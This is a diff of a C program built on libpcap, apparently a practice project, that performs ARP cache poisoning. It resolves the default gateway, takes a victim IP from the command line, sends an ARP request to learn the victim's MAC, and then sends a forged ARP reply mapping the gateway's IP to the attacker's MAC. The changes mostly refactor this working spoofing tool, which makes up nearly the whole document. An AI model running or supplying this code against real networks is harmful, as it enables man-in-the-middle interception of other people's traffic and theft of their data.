@@ -5,15 +5,14 @@
 #include <netinet/tcp.h>
 #include <netinet/ether.h>
 #include <net/if_arp.h>
-#include <string.h>   //strncpy
+#include <string.h>
 #include <sys/ioctl.h>
-#include <net/if.h>   //ifreq
-#include <unistd.h>   //close
+#include <net/if.h>
+#include <unistd.h>
 #include <ifaddrs.h>
 #include <netdb.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
-// get_mac.c
 #include <stdlib.h>
 #include <linux/rtnetlink.h>
 #include <pthread.h>
@@ -65,7 +64,7 @@ int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
 
             break;
         }
-    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));
+    } while((nlHdr->nlmsg_seq != (unsigned int)seqNum) || (nlHdr->nlmsg_pid != pId));
 
     return msgLen;
 }
@@ -88,19 +87,19 @@ void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo){
 
     for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen)){
         switch(rtAttr->rta_type){
-            case RTA_OIF:
+        case RTA_OIF:
             if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
             break;
 
-            case RTA_GATEWAY:
+        case RTA_GATEWAY:
             memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
             break;
 
-            case RTA_PREFSRC:
+        case RTA_PREFSRC:
             memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
             break;
 
-            case RTA_DST:
+        case RTA_DST:
             memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
             break;
         }
@@ -110,8 +109,6 @@ void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo){
     return;
 }
 
-
-// meat
 int get_gatewayip(char *gatewayip, socklen_t size){
     int found_gatewayip = 0;
 
@@ -181,7 +178,7 @@ int get_gatewayip(char *gatewayip, socklen_t size){
     return found_gatewayip;
 }
 
-
+void print_MAC(u_int8_t * mac);
 int main(int argc, char *argv[])
 {
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -189,7 +186,6 @@ int main(int argc, char *argv[])
     pcap_t* pDes;
     bpf_u_int32 mask;
     bpf_u_int32 net;
-
 
     int res,fd;
     struct pcap_pkthdr *header;
@@ -204,18 +200,12 @@ int main(int argc, char *argv[])
 
     unsigned char victim_ip[4];
     unsigned char victim_mac[ETH_ALEN];
-    unsigned char gw_ip[4];
 
-    victim_ip[0] = 192;
-    victim_ip[1] = 168;
-    victim_ip[2] = 6;
-    victim_ip[3] = 129;
     char gateway[20];
     get_gatewayip(gateway, 20);
+    inet_aton(argv[1], victim_ip);
 
     fprintf(stderr,"gateway:%s\n",gateway);
-
-
 
     if(0 == spNetDevName){
         printf("errbuf  :[%s]\n",errbuf);
@@ -225,10 +215,10 @@ int main(int argc, char *argv[])
     }
 
     if (pcap_lookupnet(spNetDevName, &net, &mask, errbuf) == -1) {
-                fprintf(stderr, "Couldn't get netmask for device %s: %s\n", spNetDevName, errbuf);
-                net = 0;
-                mask = 0;
-            }
+        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", spNetDevName, errbuf);
+        net = 0;
+        mask = 0;
+    }
 
     pDes = pcap_open_live(spNetDevName, 1500, 1 , 1, errbuf);
     if(0 == pDes){
@@ -252,7 +242,7 @@ int main(int argc, char *argv[])
 
         printf("Mac : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
                att_mac[0],att_mac[1],att_mac[2],att_mac[3],att_mac[4],att_mac[5]
-               );
+                );
     }
     u_int32_t my_mac[ETH_ALEN];
     memcpy(my_mac, att_mac,6);
@@ -266,7 +256,7 @@ int main(int argc, char *argv[])
         att_ip = (unsigned char *)ifr.ifr_addr.sa_data;
         printf("IP : %d.%d.%d.%d\n",
                att_ip[2],att_ip[3],att_ip[4],att_ip[5]
-               );
+                );
     }
 
     close(fd);
@@ -276,15 +266,8 @@ int main(int argc, char *argv[])
     }
 
     u_int32_t my_ip[4];
-    for(int i=0; i<4; i++) my_ip[i] = att_ip[2+i];
-
+    memcpy(my_ip, &att_ip[2], 4);   // allocate my_ip
     ehp.ether_type = htons(ETHERTYPE_ARP);
-
-    printf("DM : ");
-    print_MAC(ehp.ether_dhost);
-    printf("SM : ");
-    print_MAC(ehp.ether_shost);
-    printf("proto : %2X\n",ntohs(ehp.ether_type));
 
     struct arphdr ahp;
     ahp.ar_hrd = htons(ARPHRD_ETHER);
@@ -294,58 +277,53 @@ int main(int argc, char *argv[])
     ahp.ar_op = htons(ARPOP_REQUEST);
 
     for(int i=0; i<6; i++){
-       ahp.__ar_sha[i] = ehp.ether_dhost[i];
+        ahp.__ar_sha[i] = ehp.ether_dhost[i];
     }
     for(int i=0; i<4; i++){
-       ahp.__ar_sip[i] = my_ip[i];
+        ahp.__ar_sip[i] = my_ip[i];
     }
     for(int i=0; i<6; i++){
-       ahp.__ar_tha[i] = 0x00;
+        ahp.__ar_tha[i] = 0x00;
     }
 
-    ahp.__ar_tip[0] = (unsigned char)victim_ip[0];
-    ahp.__ar_tip[1] = (unsigned char)victim_ip[1];
-    ahp.__ar_tip[2] = (unsigned char)victim_ip[2];
-    ahp.__ar_tip[3] = (unsigned char)victim_ip[3];
+    memcpy(ahp.__ar_tip, victim_ip, 4); // allocate victim_ip to target ip
+
+    memcpy(req_arp, &ehp, sizeof(ehp)); // allocate ether_header to request arp packet
+    memcpy(&req_arp[sizeof(ehp)], &ahp, sizeof(ahp));   // allocate arp_header to request arp packet
+
+    if (pcap_sendpacket(pDes,(u_char*) req_arp, 42) != 0){  // sendpacket for victim to know victim's mac address
+        fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
+        return -1;
+    }
+
+    while((res=pcap_next_ex(pDes, &header, &pkt_data))>=0){ // collect packet
+        if(res==0) continue;    // case : time out
+        struct ether_header *ch_ehp = (struct ether_header *)pkt_data;
+        if(ntohs(ch_ehp->ether_type) != ETHERTYPE_ARP) continue;    // case : not arp packet
+        else{
+            struct arphdr *ch_ahp = (struct arphdr *)(pkt_data+14);
+            if(ntohs(ch_ahp->ar_op)  == ARPOP_REPLY){   // check reply packet
+                if(!strncmp(victim_ip, ch_ahp->__ar_sip, 4))    // check sender ip is victim ip
+                    memcpy(victim_mac, ch_ahp->__ar_sha,6); // allocate victim_mac
+            }
+            break;
+        }
+    }
+
+    memcpy(ehp.ether_dhost, victim_mac, 6);
+    memcpy(ahp.__ar_sha, my_mac, 6);
+    memcpy(ahp.__ar_tha, victim_mac, 6);
+    ahp.ar_op = htons(ARPOP_REPLY);
+
+    inet_aton(gateway, ahp.__ar_sip);   // gateway's ip convert (str) to (int)
 
     memcpy(req_arp, &ehp, sizeof(ehp));
     memcpy(&req_arp[sizeof(ehp)], &ahp, sizeof(ahp));
 
     if (pcap_sendpacket(pDes,(u_char*) req_arp, 42) != 0){
-           fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
-           return;
-       }
-
-
-    while((res=pcap_next_ex(pDes, &header, &pkt_data))>=0){
-        if(res==0) continue;
-        struct ether_header *ch_ehp = (struct ether_header *)pkt_data;
-        if(ntohs(ch_ehp->ether_type) != ETHERTYPE_ARP) continue;
-        else{
-                struct arphdr *ch_ahp = (struct arphdr *)(pkt_data+14);
-                if(ntohs(ch_ahp->ar_op)  == ARPOP_REPLY){
-                    if(!strncmp(victim_ip, ch_ahp->__ar_sip, 4))
-                        memcpy(victim_mac, ch_ahp->__ar_sha,6);
-                }
-                break;
-            }
-        }
-     memcpy(ehp.ether_dhost, victim_mac, 6);
-    memcpy(ahp.__ar_sha, my_mac, 6);
-    //memcpy(ahp.__ar_sip, gw_ip, 4);
-    memcpy(ahp.__ar_tha, victim_mac, 6);
-    ahp.ar_op = htons(ARPOP_REPLY);
-     printf("att_MAC: ");
-      print_MAC(ahp.__ar_sha);
-      inet_aton(gateway, ahp.__ar_sip);
-
-      memcpy(req_arp, &ehp, sizeof(ehp));
-     memcpy(&req_arp[sizeof(ehp)], &ahp, sizeof(ahp));
-
-     if (pcap_sendpacket(pDes,(u_char*) req_arp, 42) != 0){
-            fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
-            return;
-        }
+        fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
+        return -1;
+    }
 
     pcap_close(pDes);
     return 0;
@@ -367,7 +345,6 @@ void print_IP_str(unsigned char * ip){
         else printf("\n");
     }
 }
-
 
 void print_MAC(u_int8_t * mac){
     for(int i=0; i<6; i++){
